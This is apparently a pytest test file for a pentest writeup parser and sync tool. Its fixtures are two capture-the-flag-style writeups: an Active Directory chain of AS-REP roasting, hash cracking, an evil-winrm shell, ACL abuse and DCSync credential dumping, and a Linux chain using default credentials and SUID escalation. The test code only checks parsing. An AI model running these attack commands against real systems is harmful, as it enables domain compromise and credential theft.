"""Tests for the writeup parser and sync manager."""

import json
from pathlib import Path

import pytest
import yaml

from capo.modules.writeup_parser import WriteupParser, WriteupProfile


# --- Sample writeup content ---

SAMPLE_AD_WRITEUP = """\
# Forest — HTB

## Enumeration

Starting with an nmap scan:

```bash
nmap -Pn -p- --min-rate 5000 -T4 10.129.95.210
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
```

Anonymous LDAP enumeration:

```bash
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local"
```

RPC null session:

```bash
rpcclient -U '' -N 10.129.95.210
```

## Credential Access

AS-REP Roasting with impacket:

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.129.95.210
```

Cracking the hash:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## Exploitation

Getting a shell with evil-winrm:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
```

## Privilege Escalation

Running BloodHound:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.95.210
```

ACL abuse with bloodyAD:

```bash
bloodyAD --host 10.129.95.210 -d htb.local -u svc-alfresco -p s3rvice add groupMember "Exchange Windows Permissions" svc-alfresco
```

## Post Exploitation

DCSync:

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.95.210
```
"""

SAMPLE_LINUX_WRITEUP = """\
# BoardLight — HTB

## Scanning

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -Pn -sC -sV -p 22,80 10.10.11.11
```

## Enumeration

Checking the website:

```bash
whatweb http://10.10.11.11
curl -s http://10.10.11.11 | grep -i title
```

VHost fuzzing:

```bash
ffuf -u http://10.10.11.11 -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Found Dolibarr CMS at crm.board.htb.

## Exploitation

Default credentials admin:admin worked on Dolibarr.

```bash
python3 exploit.py http://crm.board.htb
```

## Privilege Escalation

Found credentials in config file:

```bash
linpeas
```

Found SUID binary. Escalated to root via /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys.

```bash
ssh root@10.10.11.11
```
"""

SAMPLE_MINIMAL_WRITEUP = """\
# Minimal

Just a short writeup with no real content.
"""


class TestWriteupParser:
    def setup_method(self):
        self.parser = WriteupParser()

    def test_parse_ad_writeup(self, tmp_path):
        md = tmp_path / "Forest.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        assert profile.name == "Forest"
        assert profile.platform == "windows"
        assert profile.file_hash  # non-empty

        # Should detect known tools
        assert "nmap" in profile.tools or "ldapsearch" in profile.tools
        assert "impacket-GetNPUsers" in profile.tools
        assert "evil-winrm" in profile.tools
        assert "bloodhound-python" in profile.tools
        assert "impacket-secretsdump" in profile.tools

    def test_parse_linux_writeup(self, tmp_path):
        md = tmp_path / "BoardLight.md"
        md.write_text(SAMPLE_LINUX_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        assert profile.name == "BoardLight"
        assert profile.platform == "linux"
        assert "nmap" in profile.tools
        assert "ffuf" in profile.tools
        assert "linpeas" in profile.tools

    def test_extract_ports(self, tmp_path):
        md = tmp_path / "Forest.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        open_ports = [p["port"] for p in profile.ports if p["state"] == "open"]
        assert 88 in open_ports
        assert 389 in open_ports
        assert 445 in open_ports
        assert 5985 in open_ports

    def test_extract_ports_linux(self, tmp_path):
        md = tmp_path / "BoardLight.md"
        md.write_text(SAMPLE_LINUX_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        open_ports = [p["port"] for p in profile.ports if p["state"] == "open"]
        assert 22 in open_ports
        assert 80 in open_ports

    def test_phase_mapping(self, tmp_path):
        md = tmp_path / "Forest.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        # Should have commands in multiple phases
        assert len(profile.phases) > 0
        # Recon phase should have nmap/ldapsearch
        if "recon" in profile.phases:
            recon_text = " ".join(profile.phases["recon"])
            assert "nmap" in recon_text or "ldapsearch" in recon_text

    def test_attack_chain(self, tmp_path):
        md = tmp_path / "Forest.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile = self.parser.parse(md)

        assert len(profile.attack_chain) > 0
        # Chain entries should have phase: tools format
        for entry in profile.attack_chain:
            assert ":" in entry

    def test_file_hash_changes(self, tmp_path):
        md = tmp_path / "Test.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile1 = self.parser.parse(md)

        md.write_text(SAMPLE_AD_WRITEUP + "\n## Extra section\n", encoding="utf-8")
        profile2 = self.parser.parse(md)

        assert profile1.file_hash != profile2.file_hash

    def test_file_hash_stable(self, tmp_path):
        md = tmp_path / "Test.md"
        md.write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        profile1 = self.parser.parse(md)
        profile2 = self.parser.parse(md)

        assert profile1.file_hash == profile2.file_hash


class TestWriteupSyncManager:
    def test_add_remove_source(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()

        assert mgr.add_source(str(src)) is True
        assert mgr.add_source(str(src)) is False  # duplicate
        assert len(mgr.list_sources()) == 1

        assert mgr.remove_source(str(src)) is True
        assert mgr.remove_source(str(src)) is False  # not found
        assert len(mgr.list_sources()) == 0

    def test_sync_empty(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        result = mgr.sync()
        assert result.parsed == 0
        assert result.skipped == 0

    def test_sync_parses_files(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        (src / "Forest.md").write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")
        (src / "BoardLight.md").write_text(SAMPLE_LINUX_WRITEUP, encoding="utf-8")

        mgr.add_source(str(src))
        result = mgr.sync()

        assert result.parsed == 2
        assert result.skipped == 0
        assert not result.errors

    def test_sync_skips_unchanged(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        (src / "Forest.md").write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")

        mgr.add_source(str(src))

        # First sync
        result1 = mgr.sync()
        assert result1.parsed == 1

        # Second sync — same content
        result2 = mgr.sync()
        assert result2.parsed == 0
        assert result2.skipped == 1

    def test_sync_generates_rules(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        (src / "Forest.md").write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")

        mgr.add_source(str(src))
        result = mgr.sync()

        # Should generate at least some rules
        rules_dir = tmp_path / "writeup_rules"
        assert rules_dir.exists()

        rule_files = list(rules_dir.glob("*.yaml"))
        assert len(rule_files) > 0

        # Load and verify rule structure
        data = yaml.safe_load(rule_files[0].read_text(encoding="utf-8"))
        if isinstance(data, list) and data:
            rule = data[0]
            assert "id" in rule
            assert "name" in rule
            assert "command_template" in rule

    def test_skips_small_files(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        # Write a file under 500 bytes
        (src / "Tiny.md").write_text(SAMPLE_MINIMAL_WRITEUP, encoding="utf-8")

        mgr.add_source(str(src))
        result = mgr.sync()

        assert result.parsed == 0  # skipped because too small

    def test_skips_index_files(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        # Large enough but name contains "index"
        (src / "index.md").write_text("x" * 1000, encoding="utf-8")
        (src / "README.md").write_text("x" * 1000, encoding="utf-8")

        mgr.add_source(str(src))
        result = mgr.sync()

        assert result.parsed == 0

    def test_list_sources_shows_stats(self, tmp_path, monkeypatch):
        import capo.config
        monkeypatch.setattr(capo.config, "CAPO_HOME", tmp_path)

        from capo.modules.writeup_sync import WriteupSyncManager
        mgr = WriteupSyncManager()

        src = tmp_path / "writeups"
        src.mkdir()
        (src / "Forest.md").write_text(SAMPLE_AD_WRITEUP, encoding="utf-8")

        mgr.add_source(str(src))
        sources = mgr.list_sources()

        assert len(sources) == 1
        assert sources[0]["exists"] is True
        assert sources[0]["writeups"] == 1
        assert sources[0]["last_sync"] == "never"

        # After sync, last_sync should be set
        mgr.sync()
        sources = mgr.list_sources()
        assert sources[0]["last_sync"] != "never"
